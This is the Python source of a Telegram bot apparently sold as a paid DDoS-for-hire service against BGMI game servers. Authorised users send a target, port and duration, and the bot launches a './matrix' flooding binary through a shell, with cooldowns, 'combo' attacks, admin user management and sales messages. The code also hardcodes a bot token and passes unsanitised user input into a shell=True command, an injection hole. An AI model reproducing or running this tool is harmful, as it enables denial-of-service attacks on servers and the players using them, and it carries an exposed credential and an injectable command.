#!/usr/bin/python3
# MADE BY @its_MATRiX_KiNG
import telebot
import multiprocessing
import os
import random
from datetime import datetime, timedelta
import subprocess
import sys
import time 
import logging
import socket
import pytz  # Import pytz for timezone handling

bot = telebot.TeleBot('7621477419:AAHCTnmffBI0pRWK2HXlf6-ms8PrECDEPnE')

# Admin user IDs
admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')
# File to store allowed user IDs and their expiration times
USER_FILE = "users.txt"
cooldown_timestamps = {}
# File to store command logs
LOG_FILE = "log.txt"

# Set Indian Standard Time (IST)
IST = pytz.timezone('Asia/Kolkata')

# Absolute path to the ak.bin file (modify this to point to the correct path)
AK_BIN_PATH = 'KALUAA'

# Function to read user IDs and their expiration times from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            lines = file.read().splitlines()
            users = {}
            for line in lines:
                if line.strip():
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, expiration_time = user_info
                        users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
            return users
    except FileNotFoundError:
        return {}

def save_users(users):
    with open(USER_FILE, "w") as file:
        for user_id, expiration_time in users.items():
            file.write(f"{user_id} {expiration_time.isoformat()}\n")

def remove_expired_users():
    users = read_users()
    current_time = datetime.now(IST)
    expired_users = []
    for user_id, exp_time in users.items():
        if exp_time <= current_time:
            expired_users.append(user_id)

    for user_id in expired_users:
        del users[user_id]

    if expired_users:
        save_users(users)

@bot.message_handler(commands=['add'])
def add_user(message):
    remove_expired_users()  # Check for expired users
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split()
        if len(command) == 3:
            user_to_add = command[1]
            minutes = int(command[2])
            expiration_time = datetime.now(IST) + timedelta(minutes=minutes)  # Set expiration in IST
            
            users = read_users()
            if user_to_add not in users:
                users[user_to_add] = expiration_time
                save_users(users)
                response = f"User {user_to_add} added successfully with expiration time of {minutes} minutes."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID and the expiration time in minutes."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            users = read_users()
            if user_to_remove in users:
                del users[user_to_remove]
                save_users(users)
                response = f"User {user_to_remove} removed successfully."
            else:
                response = "User not found."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    remove_expired_users()  # Check for expired users
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        users = read_users()
        response = "Authorized Users:\n"
        current_time = datetime.now(IST)
  # Get current time in IST
        active_users = [user_id for user_id, exp_time in users.items() if exp_time > current_time]
        
        if active_users:
            for user_id in active_users:
                response += f"- {user_id} (Expires at: {users[user_id]})\n"
        else:
            response = "No active users found."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)
        
@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

class AttackManager:
    def __init__(self):
        self.user_attacks = {}
        self.ongoing_attacks = []
        self.COMBO_WINDOW = 120
        self.COOLDOWN_DURATION = 300
        self.MAX_ATTACKS = 2
        self.attack_processes = {}
        
    def check_and_update_cooldowns(self):
        current_time = time.time()
        for user_id, data in list(self.user_attacks.items()):
            if 'first_attack_time' in data and 'cooldown_until' not in data:
                time_since_first = current_time - data['first_attack_time']
                if time_since_first > self.COMBO_WINDOW:
                    self.user_attacks[user_id] = {
                        'cooldown_until': current_time + self.COOLDOWN_DURATION,
                        'attack_count': data['attack_count']
                    }

    def can_attack(self, user_id):
        current_time = time.time()
        self.check_and_update_cooldowns()
        
        if user_id not in self.user_attacks:
            return True, "Attack available"
            
        user_data = self.user_attacks[user_id]
        
        if 'cooldown_until' in user_data:
            if current_time < user_data['cooldown_until']:
                remaining = int(user_data['cooldown_until'] - current_time)
                return False, f"In cooldown. Wait {remaining} seconds"
            else:
                del self.user_attacks[user_id]
                return True, "Attack available"
            
        if 'first_attack_time' in user_data:
            time_since_first = current_time - user_data['first_attack_time']
            if time_since_first <= self.COMBO_WINDOW:
                if user_data['attack_count'] < self.MAX_ATTACKS:
                    remaining_window = int(self.COMBO_WINDOW - time_since_first)
                    return True, f"Combo attack available ({self.MAX_ATTACKS - user_data['attack_count']} remaining). {remaining_window} seconds left for combo"
                else:
                    self.user_attacks[user_id] = {
                        'cooldown_until': current_time + self.COOLDOWN_DURATION
                    }
                    return False, f"Maximum attacks reached. In cooldown for {self.COOLDOWN_DURATION} seconds"
            else:
                self.user_attacks[user_id] = {
                    'cooldown_until': current_time + self.COOLDOWN_DURATION
                }
                return False, f"Combo window expired. In cooldown for {self.COOLDOWN_DURATION} seconds"
            
        return True, "Attack available"

    def execute_attack(self, attack_info, message, bot):
        target = attack_info['target']
        port = attack_info['port']
        time_duration = attack_info['time']
        
        full_command = f"./matrix {target} {port} {time_duration}"
        
        try:
            process = subprocess.Popen(
                full_command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            attack_info['process'] = process
            self.attack_processes[attack_info['id']] = process
            
            stdout, stderr = process.communicate()
            
            self.remove_ongoing_attack(attack_info['id'])
            if attack_info['id'] in self.attack_processes:
                del self.attack_processes[attack_info['id']]
            
            if process.returncode == 0:
                bot.reply_to(message, f"BGMI Attack Finished \nBY @its_MATRiX_KiNG")
            else:
                bot.reply_to(message, f"Error in BGMI Attack: {stderr.decode()}")
                
        except Exception as e:
            self.remove_ongoing_attack(attack_info['id'])
            if attack_info['id'] in self.attack_processes:
                del self.attack_processes[attack_info['id']]
            bot.reply_to(message, f"Exception occurred while executing the command.\n{str(e)}")

    def record_attack(self, user_id):
        current_time = time.time()
        self.check_and_update_cooldowns()
        
        if user_id not in self.user_attacks:
            self.user_attacks[user_id] = {
                'first_attack_time': current_time,
                'attack_count': 1
            }
            return f"First attack started! You have {self.COMBO_WINDOW} seconds for second attack"
        else:
            user_data = self.user_attacks[user_id]
            if 'cooldown_until' in user_data:
                return "Attack started (in cooldown period)"
            
            user_data['attack_count'] += 1
            if user_data['attack_count'] >= self.MAX_ATTACKS:
                self.user_attacks[user_id] = {
                    'cooldown_until': current_time + self.COOLDOWN_DURATION
                }
                return f"Final combo attack started! Entering {self.COOLDOWN_DURATION} seconds cooldown"
                
            time_since_first = current_time - user_data['first_attack_time']
            remaining_window = max(0, self.COMBO_WINDOW - time_since_first)
            return f"Attack started! {remaining_window} seconds left for combo window"

    def add_ongoing_attack(self, attack_info):
        attack_info['id'] = str(time.time())
        self.ongoing_attacks.append(attack_info)
        return attack_info

    def remove_ongoing_attack(self, attack_id):
        self.ongoing_attacks = [attack for attack in self.ongoing_attacks if attack['id'] != attack_id]

    def get_ongoing_attacks(self):
        self.check_and_update_cooldowns()
        current_time = datetime.now(IST)
        active_attacks = []
        
        for attack in self.ongoing_attacks:
            if 'process' in attack and attack['process'].poll() is not None:
                self.remove_ongoing_attack(attack['id'])
                continue
            active_attacks.append(attack)
            
        self.ongoing_attacks = active_attacks
        return self.ongoing_attacks

# Initialize the global attack_manager
attack_manager = AttackManager()

# Function to read user IDs and their expiration times from the file
def start_attack_reply(message, target, port, time_duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    user_id = str(message.chat.id)

    status_message = attack_manager.record_attack(user_id)

    attack_info = {
        'user': username,
        'target': target,
        'port': port,
        'time': time_duration,
        'start_time': datetime.now(IST)
    }
    
    attack_info = attack_manager.add_ongoing_attack(attack_info)

    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time_duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n" + status_message + "\nBY @its_MATRiX_KiNG"
    bot.reply_to(message, response)

    # Start attack in a separate process
    attack_process = multiprocessing.Process(
        target=attack_manager.execute_attack,
        args=(attack_info, message, bot)
    )
    attack_process.start()

@bot.message_handler(commands=['matrix'])
def handle_matrix(message):
    remove_expired_users()
    user_id = str(message.chat.id)
    users = read_users()
    command = message.text.split()
    
    response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRiX_KiNG"

    if user_id in admin_owner or user_id in users:
        can_attack, status_message = attack_manager.can_attack(user_id)
        
        if not can_attack:
            response = status_message
        else:
            if len(command) == 4:
                try:
                    target = command[1]
                    port = int(command[2])
                    time = int(command[3])

                    if time > 180:
                        response = "Error: Time interval must be 180 seconds or less"
                    else:
                        start_attack_reply(message, target, port, time)
                        return
                except ValueError:
                    response = "Error: Please ensure port and time are integers."
            else:
                response = "Usage: /matrix <target> <port> <time>"

    bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def show_status(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner or user_id in read_users():
        ongoing_attacks = attack_manager.get_ongoing_attacks()
        response = "Ongoing Attacks:\n\n"
        
        if ongoing_attacks:
            for attack in ongoing_attacks:
                time_remaining = ""
                if 'start_time' in attack and 'time' in attack:
                    elapsed = (datetime.now(IST) - attack['start_time']).total_seconds()
                    remaining = max(0, attack['time'] - elapsed)
                    time_remaining = f"\nTime Remaining: {int(remaining)} seconds"
                
                response += (f"User: {attack['user']}\nTarget: {attack['target']}\n"
                           f"Port: {attack['port']}\nTime: {attack['time']} seconds\n"
                           f"Started at: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')}"
                           f"{time_remaining}\n\n")
        else:
            response += "No ongoing attacks currently."

        if user_id in attack_manager.user_attacks:
            user_data = attack_manager.user_attacks[user_id]
            current_time = time.time()
            
            if 'cooldown_until' in user_data:
                remaining = int(user_data['cooldown_until'] - current_time)
                if remaining > 0:
                    response += f"\nYour Status: In cooldown for {remaining} seconds"
            elif 'first_attack_time' in user_data:
                time_since_first = current_time - user_data['first_attack_time']
                remaining_window = max(0, attack_manager.COMBO_WINDOW - time_since_first)
                if remaining_window > 0:
                    response += f"\nYour Status: Combo window active for {int(remaining_window)} seconds"
                    response += f"\nAttacks used: {user_data['attack_count']}/{attack_manager.MAX_ATTACKS}"

        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to view the status.")

@bot.message_handler(commands=['help'])
def show_help(message):
    try:
        user_id = str(message.chat.id)

        # Basic help text for all users
        help_text = '''Available Commands:
    - /matrix : Execute a BGMI server attack (specific conditions apply).
    - /rulesanduse : View usage rules and important guidelines.
    - /plan : Check available plans and pricing for the bot.
    - /status : View ongoing attack details.
    - /id : Retrieve your user ID.
    '''

        # Check if the user is an admin and append admin commands
        if user_id in admin_id:
            help_text += '''
Admin Commands:
    - /add <user_id> <time_in_minutes> : Add a user with specified time.
    - /remove <user_id> : Remove a user from the authorized list.
    - /allusers : List all authorized users.
    - /broadcast : Send a broadcast message to all users.
    '''

        # Footer with channel and owner information
        help_text += ''' 
JOIN CHANNEL - @MATRiX_CHEATS
BUY / OWNER - @Insaaaanxd
'''

        # Send the constructed help text to the user
        bot.reply_to(message, help_text)
    
    except Exception as e:
        logging.error(f"Error in /help command: {e}")
        bot.reply_to(message, "An error occurred while fetching help. Please try again.")
    
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Our BOT, {user_name}\nRun This Command : /help\nJOIN CHANNEL - @MATRiX_CHEATS\nBUY / OWNER - @its_MATRiX_KiNG "
    bot.reply_to(message, response)

@bot.message_handler(commands=['rulesanduse'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Time Should Be 180 or Below
2. Click /status Before Entering Match
3. If There Are Any Ongoing Attacks You Cant use Wait For Finish
JOIN CHANNEL - @MATRiX_CHEATS
BUY / OWNER - @its_MATRiX_KiNG '''
   
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 
    Purchase VIP DDOS Plan From @its_MATRiX_KiNG
    Join Channel @MATRiX_CHEATS
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_id = str(message.chat.id)

    # Check if user is in owners.txt
    with open('owner.txt', "r") as file:
        owners = file.read().splitlines()

    if user_id in owners:
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:

        /add <userId> : Add a User.
        /remove <userId> : Remove a User.
        /allusers : Authorized Users List.
        /broadcast : Broadcast a Message.
        Channel - @MATRiX_CHEATS
        Owner/Buy - @its_MATRiX_KiNG
        '''
        bot.reply_to(message, response)
    else:
        response = "You do not have permission to access admin commands."
        bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open('users.txt', "r") as file:
                users = file.read().splitlines()
                if users:
                    for user in users:
                        try:
                            bot.send_message(user, message_to_broadcast)
                        except Exception as e:
                            print(f"Failed to send broadcast message to user {user}: {str(e)}")
                    response = "Broadcast Message Sent Successfully To All Users."
                else:
                    response = "No users found in users.txt."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

def run_bot():
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)  # Add timeout to prevent long idle periods
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")
            time.sleep(15)  # Sleep before restarting the bot

if __name__ == "__main__":
    run_bot()
